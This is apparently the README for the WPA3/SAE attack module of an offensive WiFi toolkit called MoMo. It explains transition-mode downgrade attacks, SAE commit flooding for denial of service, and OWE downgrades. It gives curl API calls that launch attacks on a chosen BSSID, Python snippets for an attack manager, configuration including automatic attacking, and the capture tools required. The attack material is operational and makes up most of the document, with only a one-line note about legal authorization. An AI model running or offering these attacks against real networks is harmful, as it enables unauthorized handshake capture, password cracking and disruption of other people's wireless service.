# MoMo WPA3/SAE Attack Module

> Phase 0.10.0 - Modern WiFi Security Attack Vectors

## Overview

WPA3 uses SAE (Simultaneous Authentication of Equals) based on the Dragonfly key exchange, making traditional WiFi attacks more difficult:

| Feature | WPA2 | WPA3 |
|---------|------|------|
| Key Exchange | 4-way handshake | SAE (Dragonfly) |
| Offline Dictionary | Vulnerable | Resistant |
| PMKID Attack | Possible | Not applicable |
| Deauth Attack | Works | Blocked (if PMF required) |
| Downgrade | N/A | Possible in transition mode |

## Attack Vectors

### 1. Transition Mode Downgrade

Most WPA3 deployments use **transition mode** (WPA2 + WPA3) for backwards compatibility. This is the primary attack vector:

```
┌─────────────────┐      ┌──────────────┐      ┌─────────────────┐
│     Client      │      │   MoMo       │      │   Target AP     │
│  (WPA3 capable) │      │  (Attacker)  │      │ (Transition)    │
└────────┬────────┘      └──────┬───────┘      └────────┬────────┘
         │                      │                       │
         │  ◄──── Deauth ──────│                       │
         │        (if no PMF)   │                       │
         │                      │                       │
         │ ──── Reconnect ────►│                       │
         │      (WPA2 mode)     │                       │
         │                      │                       │
         │                      │ ◄── Capture PMKID ───│
         │                      │     or 4-way shake   │
         │                      │                       │
```

### 2. SAE Flood Attack (DoS)

For pure WPA3 networks, we can perform denial-of-service via SAE commit flooding:

```
┌─────────────────┐      ┌──────────────────────────┐
│     MoMo        │      │      Target AP           │
│   (Attacker)    │      │   (Pure WPA3)            │
└────────┬────────┘      └───────────┬──────────────┘
         │                           │
         │ ─── SAE Commit ──────────►│  CPU: 5%
         │ ─── SAE Commit ──────────►│  CPU: 15%
         │ ─── SAE Commit ──────────►│  CPU: 35%
         │ ─── SAE Commit ──────────►│  CPU: 70%
         │       ...                 │  CPU: 95% 🔥
         │ ─── SAE Commit ──────────►│  (DoS)
```

### 3. PMF (Protected Management Frames)

PMF status is critical for attack planning:

| PMF Status | Deauth Works? | Attack Strategy |
|------------|---------------|-----------------|
| Disabled | ✅ Yes | Standard deauth + capture |
| Optional | ✅ Yes | Client may not use PMF |
| Required | ❌ No | Evil Twin or SAE flood |

## API Endpoints

### Scan for WPA3 Networks

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8080/api/wpa3/scan
```

Response:
```json
{
  "networks": [
    {
      "bssid": "AA:BB:CC:DD:EE:01",
      "ssid": "Office_WiFi",
      "wpa3_mode": "transition",
      "sae_status": "transition",
      "pmf_status": "optional",
      "is_downgradable": true,
      "is_vulnerable_to_deauth": true,
      "attack_recommendations": [
        "DOWNGRADE: Force WPA2 association, then capture PMKID/handshake",
        "DEAUTH: PMF not required, standard deauth works"
      ]
    }
  ],
  "total": 5,
  "wpa3_count": 2,
  "downgradable_count": 1
}
```

### Get Downgradable Networks

```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:8080/api/wpa3/downgradable
```

### Execute Attack

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"bssid": "AA:BB:CC:DD:EE:01", "attack_type": "downgrade", "duration": 60}' \
  http://localhost:8080/api/wpa3/attack
```

Response:
```json
{
  "attack_type": "downgrade",
  "target_bssid": "AA:BB:CC:DD:EE:01",
  "target_ssid": "Office_WiFi",
  "status": "success",
  "success": true,
  "captured_file": "/captures/wpa3/downgrade_AABBCCDDEE01_1702400000.22000",
  "packets_sent": 50,
  "duration_seconds": 45.2
}
```

### Attack Types

| Type | Description | Requirements |
|------|-------------|--------------|
| `downgrade` | Force WPA2 on transition networks | Transition mode |
| `sae_flood` | DoS via SAE commit flood | SAE support |
| `owe_downgrade` | Force open on OWE transition | OWE transition |
| `null` (auto) | Auto-select best attack | Any |

## Configuration

```yaml
# configs/momo.yml
wpa3:
  enabled: true
  interface: wlan0
  auto_scan: true
  scan_interval: 60
  auto_attack: false
  attack_duration: 60
  output_dir: captures/wpa3
  prefer_downgrade: true
  deauth_interval: 5
```

## Components

### WPA3Detector

Detects WPA3 capabilities from beacon/probe response frames:

```python
from momo.infrastructure.wpa3 import WPA3Detector

detector = WPA3Detector("wlan0")
await detector.start()

# Scan all networks
caps_list = await detector.scan_all()

# Check specific AP
caps = await detector.detect_ap("AA:BB:CC:DD:EE:FF")
if caps.is_downgradable:
    print("Downgrade attack possible!")
```

### WPA3AttackManager

Executes attacks based on target capabilities:

```python
from momo.infrastructure.wpa3 import WPA3AttackManager

manager = WPA3AttackManager("wlan0")
await manager.start()

# Auto-select best attack
result = await manager.attack(caps, attack_type=None)

if result.success:
    print(f"Captured: {result.captured_file}")
```

## Detection Logic

WPA3 detection parses `iw scan` output for RSN IE:

```
BSS aa:bb:cc:dd:ee:ff
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: SAE PSK    ← Transition mode!
                 * Capabilities: MFPC MFPR           ← PMF required
```

AKM Suite OIDs:
- `00-0f-ac:2` → WPA2-PSK
- `00-0f-ac:8` → WPA3-SAE
- `00-0f-ac:18` → OWE

## Metrics

```
momo_wpa3_scans_total          # Total WPA3 scans
momo_wpa3_networks_found       # WPA3 networks discovered
momo_wpa3_downgradable_found   # Transition mode networks
momo_wpa3_attacks_total        # Attack attempts
momo_wpa3_attacks_successful   # Successful attacks
momo_wpa3_handshakes_captured  # Handshakes/PMKIDs captured
```

## Requirements

- **hcxdumptool** - For handshake capture
- **hcxpcapngtool** - For hash conversion
- **mdk4** - For deauth and SAE flood
- **iw** - For WPA3 detection

Install on Debian/Ubuntu:
```bash
sudo apt install hcxdumptool hcxtools mdk4 iw
```

## Security Considerations

1. **Legal Authorization** - Only use on networks you own or have permission to test
2. **PMF Impact** - WPA3 with PMF required significantly limits attack options
3. **Transition Mode** - The main vulnerability; recommend pure WPA3 for security
4. **Detection** - WPA3 attacks may trigger WIDS/WIPS alerts

## References

- [Dragonblood: Analyzing WPA3's Dragonfly Handshake](https://wpa3.mathyvanhoef.com/)
- [WPA3 Specification (Wi-Fi Alliance)](https://www.wi-fi.org/discover-wi-fi/security)
- [RFC 7664: Dragonfly Key Exchange](https://tools.ietf.org/html/rfc7664)

